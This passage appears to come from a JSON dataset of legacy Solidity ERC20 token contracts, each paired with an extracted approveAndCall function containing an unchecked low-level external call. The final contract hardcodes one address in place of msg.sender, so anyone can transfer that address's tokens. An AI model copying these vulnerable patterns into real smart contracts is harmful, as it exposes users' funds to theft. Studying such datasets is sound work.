_owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Ncash is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function Ncash(\n ) {\n balances[msg.sender] = 21000000;\n totalSupply = 21000000;\n name = \"Ncash\";\n decimals = 0;\n symbol = \"NSH\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14e6"
  },
  "filename": "33118.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract PEERBANKS is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function PEERBANKS (\n ) {\n balances[msg.sender] = 100000000000000;\n totalSupply = 100000000000000;\n name = \"PEERBANKS\";\n decimals = 8;\n symbol = \"IRA\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14e7"
  },
  "filename": "33121.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14e8"
  },
  "filename": "33131.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract PEERBANKS is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function PEERBANKS (\n ) {\n balances[msg.sender] = 1000000;\n totalSupply = 1000000;\n name = \"Peerbanks\";\n decimals = 8;\n symbol = \"IRA\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14e9"
  },
  "filename": "33136.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000000;\n totalSupply = 1000000000000;\n name = \"ETHEREUM RED\";\n decimals = 0;\n symbol = \"ETHR\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14ea"
  },
  "filename": "33161.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 6000000;\n totalSupply = 6000000;\n name = \"Metacube\";\n decimals = 0;\n symbol = \"MTC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14eb"
  },
  "filename": "33176.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 100000000;\n totalSupply = 100000000;\n name = \"Digibraltara\";\n decimals = 2;\n symbol = \"DGIB\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14ec"
  },
  "filename": "33197.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000;\n totalSupply = 10000000;\n name = \"noobtoken\";\n decimals = 8;\n symbol = \"NOOB\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14ed"
  },
  "filename": "33209.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract MONEYFREEDOM is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function MONEYFREEDOM(\n ) {\n balances[msg.sender] = 1315;\n totalSupply = 1315;\n name = \"Liberty\";\n decimals = 0;\n symbol = \"LBRTY\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14ee"
  },
  "filename": "33216.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract FOREVERFREE is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function FOREVERFREE(\n ) {\n balances[msg.sender] = 100;\n totalSupply = 100;\n name = \"FOREVER FREE\";\n decimals = 0;\n symbol = \"4EVA\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14ef"
  },
  "filename": "33222.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000;\n totalSupply = 10000000;\n name = \"MERGE\";\n decimals = 18;\n symbol = \"MGE\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14f0"
  },
  "filename": "33231.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[0x774F6B8302213946165c10F6Ea2011AF91cF8711] >= _value && _value > 0) {\n balances[0x774F6B8302213946165c10F6Ea2011AF91cF8711] -= _value;\n balances[_to] += _value;\n Transfer(0x774F6B8302213946165c10F6Ea2011AF91cF8711, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][0x774F6B8302213946165c10F6Ea2011AF91cF8711] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][0x774F6B8302213946165c10F6Ea2011AF91cF8711] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[0x774F6B8302213946165c10F6Ea2011AF91cF8711][_spender] = _value;\n Approval(0x774F6B8302213946165c10F6Ea2011AF91cF8711, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract FunnyComments is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function FunnyComments(\n ) {\n balances[0x774F6B8302213946165c10F6Ea2011AF91cF8711] = 10000000000;\n totalSupply = 10000000000;\n name = \"Funny Comments\";\n decimals = 2;\n symbol = \"LOL\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[0x774F6B8302213946165c10F6Ea2011AF91cF8711][_spender] = _value;\n Approval(0x774F6B8302213946165c10F6Ea2011AF91cF8711, _spender, _value);\n 